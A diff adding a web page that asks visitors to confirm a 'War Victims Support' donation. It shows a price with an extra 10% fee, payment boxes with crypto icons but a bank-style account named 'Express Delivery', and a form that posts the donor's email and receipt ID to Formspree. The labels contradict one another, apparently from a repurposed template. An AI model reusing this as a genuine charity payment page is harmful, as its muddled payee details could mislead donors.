@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Crypto Payment | War Victims Support</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet"/>
+  <link rel="shortcut icon" href="/assets/logo4.png" type="image/webp" />
+  <style>
+    *{
+        box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: #eef2f7;
+      color: #1d1d1d;
+      padding: 40px 20px;
+      box-sizing: border-box;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: auto;
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.1);
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 26px;
+      color: #004080;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 10px;
+      margin-top: 20px;
+      color: #333;
+    }
+
+      textarea,input {
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+    textarea{
+      resize: none;
+    }
+
+    .wallet {
+      background: #f7faff;
+      border-left: 5px solid #004080;
+      padding: 20px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .wallet h3 {
+      font-size: 16px;
+      margin: 0 0 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #004080;
+    }
+
+    .wallet p {
+      margin: 0;
+      font-size: 14px;
+      word-break: break-word;
+      color: #333;
+    }
+
+    .copy-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      padding: 6px 10px;
+      font-size: 12px;
+      background: #004080;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .copy-btn:hover {
+      background: #0056b3;
+    }
+
+    .warning {
+      background: #fff8e1;
+      color: #7c5700;
+      border-left: 5px solid #ffc107;
+      padding: 15px 20px;
+      border-radius: 10px;
+      margin-top: 30px;
+      font-size: 14px;
+    }
+
+    .price-summary {
+      margin-top: 20px;
+      margin-bottom: 20px;
+      padding: 20px;
+      background: #e6f0ff;
+      border-radius: 10px;
+      color: #004080;
+      font-size: 16px;
+    }
+
+    #copyModal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0,0,0,0.6);
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-content {
+      background: white;
+      padding: 25px 30px;
+      max-width: 400px;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    }
+
+    .modal-content button {
+      background: #004080;
+      color: white;
+      padding: 8px 20px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .verify-btn {
+      margin-top: 20px;
+      padding: 12px 25px;
+      background-color: #004080;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s ease;
+    }
+
+    .verify-btn:hover {
+      background-color: #0056b3;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        padding: 30px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Confirm Your Donation</h1>
+
+
+
+  <div class="price-summary" id="priceBox" >
+    <p><strong>Service Price:</strong> $<span id="basePrice">0</span></p>
+    <p><strong>+ 10% amount:</strong> $<span id="fee">0</span></p>
+    <p><strong>Total to Pay:</strong> $<span id="total">0</span></p>
+  </div>
+
+  <div class="wallet">
+    <h3><i class="fab fa-bitcoin"></i> Account Name:</h3>
+    <p id="btc-address">Express Delivery</p>
+    
+  </div>
+
+  <div class="wallet">
+    <h3><i class="fab fa-ethereum"></i> Account Number</h3>
+    <p id="eth-address">0123456789</p>
+    <button class="copy-btn" onclick="copyToClipboard('eth-address')">Copy</button>
+  </div>
+<!-- 
+  <div class="wallet">
+    <h3><i class="fab fa-sourcetree"></i> Solana (SOL)</h3>
+    <p id="sol-address">8SdExampleSolWalletXYZ789sol</p>
+    <button class="copy-btn" onclick="copyToClipboard('sol-address')">Copy</button>
+  </div> -->
+
+
+<form id="payment">
+  
+    <label for="email">Your Email Address</label>
+    <input 
+      type="email" 
+      id="email" 
+      name="email" 
+      placeholder="example@domain.com" 
+      readonly
+      style="width: 100%; padding: 12px 16px; border-radius: 8px; border: 1px solid #ccc; font-size: 16px; margin-bottom: 15px; outline: none; color: gray;"
+    />
+    
+  <label for="hash">Enter Receipt Id</label>
+  <textarea id="hash" rows="4" name="rec" placeholder="Paste your transaction ID or hash for confirmation..." required></textarea>
+
+  <button type="submit" class="verify-btn">Verify Now</button>
+</form>
+
+  <div class="warning">
+    ⚠️ Please double-check and copy the correct account number. Payments are non-refundable if sent to the wrong account.
+  </div>
+</div>
+
+<!-- Modal -->
+<div id="copyModal">
+  <div class="modal-content">
+    <p>Account Number copied to clipboard ✅</p>
+    <button onclick="closeModal()">OK</button>
+  </div>
+</div>
+
+<script>
+
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.getElementById("payment");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault(); // Prevent the default form reload
+
+      const formData = new FormData(form);
+      const jsonData = {};
+
+      formData.forEach((value, key) => {
+        jsonData[key] = value;
+      });
+
+      fetch("https://formspree.io/f/mdkenbez", { // Replace with your Formspree ID
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(jsonData)
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "Thank-You.html"; // Redirect after submission
+        } else {
+          alert("Payment Details Submission failed. Please try again.");
+        }
+      })
+      .catch(error => {
+        console.error("Submission error:", error);
+        alert("An error occurred while Submitting.");
+      });
+    });
+  });
+
+
+const amount = parseFloat(localStorage.getItem("donationAmount") || 0);
+    const fee = +(amount * 0.10).toFixed(2);
+    const total = amount + fee;
+
+    document.getElementById("basePrice").textContent = amount.toFixed(2);
+    document.getElementById("fee").textContent = fee.toFixed(2);
+    document.getElementById("total").textContent = total.toFixed(2);
+
+
+// Set email
+const savedEmail = localStorage.getItem("donorEmail");
+if (savedEmail) {
+  document.getElementById("email").value = savedEmail;
+}
+
+
+    function copyText(id) {
+      const text = document.getElementById(id).innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        alert("Address copied!");
+      });
+    }
+
+  function copyToClipboard(id) {
+    const text = document.getElementById(id).innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      const modal = document.getElementById("copyModal");
+      modal.style.display = "flex";
+    });
+  }
+
+  function closeModal() {
+    document.getElementById("copyModal").style.display = "none";
+  }
+</script>
+
+</body>
+</html>
